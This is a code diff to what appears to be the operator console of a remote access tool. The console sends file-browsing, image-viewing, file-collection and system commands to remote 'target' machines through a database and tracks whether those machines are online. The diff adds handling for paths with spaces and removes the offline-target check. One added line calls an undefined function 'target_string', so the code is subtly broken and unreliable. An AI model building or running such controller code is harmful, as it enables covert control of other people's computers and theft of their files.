@@ -81,6 +81,15 @@ def targetInfo():
         print(Fore.CYAN+">>> ")
         print("No Public IP Found!!!")
 
+def target_strings(a,index):
+    strr=""
+    for i in range(index,len(a)):
+        if i==len(a)-1:
+            strr+=a[i]
+        else:
+            strr+=a[i]+" "
+    return strr
+
 def check_online():
     global STOP,TARGET,STATUS
     while True:
@@ -101,7 +110,7 @@ def check_online():
             new_arry=arry[1].split(":")
             if(i['hostname']==TARGET):
                 STATUS=i['status']
-            if (int(minute) > int(new_arry[1]) and strr==arry[0]):
+            if ((int(minute) > int(new_arry[1]) and strr==arry[0]) or (strr!=arry[0])):
                 filters={
                 "hostname":i['hostname']
                 }
@@ -114,7 +123,7 @@ def check_online():
                     col.update_one(filters,value)
                 except Exception as e:
                     print(e)
-            else:
+            elif (int(minute) <= int(new_arry[1]) and strr==arry[0]):
                 filters={
                 "hostname":i['hostname']
                 }
@@ -338,7 +347,8 @@ def is_directory_change_command():
             print("invalid navigate")
         else:
             if CWD and CWD[len(CWD)-1]!='\\':
-                a[1]='\\'+a[1]
+                a[1]='\\'+target_strings(a=a,index=1)
+                
             CWD=CWD+f'{a[1]}'
             LAST_PATH=f'{a[1]}'
     elif a[0]=='cd..':
@@ -363,13 +373,13 @@ def ActionUploader():
             print(i)
         print()
 
-    elif a[0]=='showimg' and len(a)==2:
-        target_element=a[1]
+    elif a[0]=='showimg':
+        target_element=target_strings(a,1)
         data={
                 "action":a[0],
                 "target":TARGET,
                 "current_path":CWD,
-                "target_element":a[1],
+                "target_element":target_element,
                 "new_filename":"",
                 "target_string":"",
                 "is_systemCommand":0
@@ -412,13 +422,13 @@ def ActionUploader():
             except Exception as e:
                     print(e)
 
-    elif a[0]=='getfilesize' and len(a)==2:
-        target_element=a[1]
+    elif a[0]=='getfilesize':
+        target_element=target_strings(a,1)
         data={
                 "action":a[0],
                 "target":TARGET,
                 "current_path":CWD,
-                "target_element":a[1],
+                "target_element":target_element,
                 "new_filename":"",
                 "target_string":"",
                 "is_systemCommand":0
@@ -526,14 +536,14 @@ def ActionUploader():
     elif a[0]=='shifttarget' and len(a)==2:
         getTargetMachine(target=a[1])
 
-    elif a[0]=='getalltypefiles' and len(a)==2:
-        target_element=a[1]
-        FILENAME=a[1]
+    elif a[0]=='getalltypefiles':
+        target_element=target_strings(a,1)
+        FILENAME=target_string(a,1)
         data={
                 "action":a[0],
                 "target":TARGET,
                 "current_path":CWD,
-                "target_element":a[1],
+                "target_element":target_element,
                 "new_filename":"",
                 "target_string":"",
                 "is_systemCommand":0
@@ -558,8 +568,8 @@ def ActionUploader():
             action=a[0]
             current_path=CWD
             target=TARGET
-            if len(a)==2:
-                target_element=a[1]
+            if len(a)>=2:
+                target_element=target_strings(a,1)
                 data={
                 "action":action,
                 "target":target,
@@ -667,12 +677,12 @@ def shell():
                     clearCollection()
                     STOP=True
                     break
-                if STATUS=='Online' or command=='targetlist' or command=='shifttarget' or command=='commands':
-                    is_directory_change_command()
-                    ActionUploader()
-                else:
-                    print(Fore.CYAN+">>> ")
-                    print(Fore.CYAN+f"Target is Offline mode")
+                #if STATUS=='Online' or command=='targetlist' or command=='shifttarget' or command=='commands':
+                is_directory_change_command()
+                ActionUploader()
+               #else:
+                    #print(Fore.CYAN+">>> ")
+                    #print(Fore.CYAN+f"Target is Offline mode")
 
         except Exception as e:
                 print(e)
